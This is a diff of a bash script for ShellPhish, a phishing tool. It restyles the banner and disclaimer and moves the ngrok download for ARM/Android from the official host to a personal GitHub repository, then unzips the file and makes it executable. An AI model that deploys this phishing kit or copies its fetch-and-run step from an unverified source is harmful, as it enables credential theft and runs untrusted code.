@@ -136,18 +136,15 @@ fi
 }
 
 banner() {
-
-printf "\e[1;77m     _     _             _  _  ______   _      _        _      \e[0m\n"
-printf "\e[1;77m    | |   | |           | || |(_____ \ | |    (_)      | |     \e[0m\n"
-printf "\e[1;77m     \ \  | | _    ____ | || | _____) )| | _   _   ___ | | _   \e[0m\n"
-printf "\e[1;77m      \ \ | || \  / _  )| || ||  ____/ | || \ | | /___)| || \  \e[0m\n"
-printf "\e[1;77m  _____) )| | | |( (/ / | || || |      | | | || ||___ || | | | \e[0m\n"
-printf "\e[1;77m (______/ |_| |_| \____)|_||_||_|      |_| |_||_|(___/ |_| |_| v1.7\e[0m\n"
 printf "\n"
-printf "\e[1;93m       .:.:.\e[0m\e[1;77m Phishing Tool coded by:  @linux_choice \e[0m\e[1;93m.:.:.\e[0m\n"
+printf "\e[33m▒█▀▀▀█ █░░█ █▀▀ █░░ █░░ ▒█▀▀█ █░░█ ░▀░ █▀▀ █░░█\e[0m\n"
+printf "\e[33m░▀▀▀▄▄ █▀▀█ █▀▀ █░░ █░░ ▒█▄▄█ █▀▀█ ▀█▀ ▀▀█ █▀▀█\e[0m\n"
+printf "\e[33m▒█▄▄▄█ ▀░░▀ ▀▀▀ ▀▀▀ ▀▀▀ ▒█░░░ ▀░░▀ ▀▀▀ ▀▀▀ ▀░░▀\e[0m\n"
 printf "\n"
-printf "  \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
-printf "  \e[101m\e[1;77m:: responsible for any misuse or damage caused by ShellPhish ::\e[0m\n"
+printf "\e[1;77m Phishing Tool coded by:  @linux_choice \e[0m\n"
+printf "\n"
+printf "\e[101m\e[1;77mDisclaimer: Developers assume no liability and are not\e[0m\n"
+echo -e "\e[101m\e[1;77mresponsible for any misuse or damage caused by ShellPhish\e[0m\n"
 printf "\n"
 }
 
@@ -358,12 +355,12 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
+wget https://github.com/remo7777/REMO773/raw/master/Ngrok-linux-arm.zip > /dev/null 2>&1
 
-if [[ -e ngrok-stable-linux-arm.zip ]]; then
-unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
+if [[ -e Ngrok-linux-arm.zip ]]; then
+unzip Ngrok-linux-arm.zip > /dev/null 2>&1
 chmod +x ngrok
-rm -rf ngrok-stable-linux-arm.zip
+rm -rf Ngrok-linux-arm.zip
 else
 printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
 exit 1
